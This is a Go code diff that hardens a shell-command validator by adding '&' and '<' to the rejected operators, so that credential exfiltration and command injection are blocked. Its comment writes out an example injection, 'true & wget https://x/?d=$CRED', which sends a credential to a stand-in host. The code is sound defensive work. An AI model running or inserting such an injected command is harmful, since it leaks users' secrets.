@@ -26,6 +26,14 @@ var credentialIDPattern = regexp.MustCompile(`^[a-zA-Z0-9_\-]+$`)
 // containsDangerousShellChars checks if a command contains shell operators that
 // could be used for credential exfiltration or command injection.
 // Content inside single quotes is considered safe (shell does not interpret them).
+//
+// A bare "&" backgrounds the left command and immediately runs whatever follows
+// it — a command separator exactly like ";" — so "true & wget https://x/?d=$CRED"
+// exfiltrates the injected credential. "<" opens input redirection, process
+// substitution "<(…)" or a here-doc "<<", any of which can chain or feed a
+// second command. Both are rejected alongside the classic ";", "|", ">" and
+// backtick. "$VAR" expansion stays allowed; only command substitution "$(" is
+// blocked. (The single-char "&" and "|" checks subsume the earlier "&&"/"||".)
 func containsDangerousShellChars(cmd string) bool {
 	if strings.ContainsAny(cmd, "\n\r") {
 		return true
@@ -35,10 +43,10 @@ func containsDangerousShellChars(cmd string) bool {
 		if i%2 == 1 {
 			continue // inside single quotes — safe
 		}
-		if strings.ContainsAny(part, ";|>`") {
+		if strings.ContainsAny(part, ";|>&<`") {
 			return true
 		}
-		if strings.Contains(part, "&&") || strings.Contains(part, "||") || strings.Contains(part, "$(") {
+		if strings.Contains(part, "$(") {
 			return true
 		}
 	}
